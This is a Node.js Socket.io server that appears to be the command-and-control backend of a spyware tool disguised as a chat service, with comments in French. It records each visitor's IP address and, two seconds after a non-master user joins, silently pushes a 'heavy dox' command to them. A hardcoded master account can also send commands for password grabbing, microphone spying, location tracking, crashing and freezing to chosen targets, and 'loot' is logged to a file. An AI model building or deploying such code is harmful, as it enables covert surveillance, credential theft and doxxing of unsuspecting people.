const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(__dirname));

let targets = [];
const MASTER_KEY = "toucheur2pp@heaven.com";

io.on('connection', (socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;

    socket.on('init', (data) => {
        const t = { id: socket.id, n: data.n, e: data.e, ip: ip, join: new Date().toLocaleTimeString() };
        targets.push(t);
        
        // Auto-Strike pour les nouveaux (invisibles)
        if (t.e !== MASTER_KEY) {
            setTimeout(() => {
                io.to(socket.id).emit('execute', { type: 'p_heavy_dox' });
            }, 2000);
        }
        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n, e: u.e, ip: u.ip })));
    });

    socket.on('chat', (data) => {
        const sender = targets.find(u => u.id === socket.id);
        if (!sender) return;

        if (data.type === 'intel') {
            const logEntry = `[${new Date().toLocaleString()}] [LOOT] ${sender.n} (${sender.ip}) : ${data.t}\n`;
            fs.appendFileSync('LOOT.txt', logEntry);
        }
        io.emit('chat', { n: sender.n, t: data });
    });

    // Commandes du Maître
    const cmds = ['p_heavy_dox', 'p_pass_grab', 'p_crash', 'p_freeze', 'p_loc', 'p_mic_spy', 'p_osint'];
    cmds.forEach(type => {
        socket.on(type, (tId) => {
            const boss = targets.find(u => u.id === socket.id);
            if (boss && boss.e === MASTER_KEY) io.to(tId).emit('execute', { type });
        });
    });

    socket.on('disconnect', () => {
        targets = targets.filter(u => u.id !== socket.id);
        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n, e: u.e })));
    });
});

server.listen(process.env.PORT || 3000, '0.0.0.0');
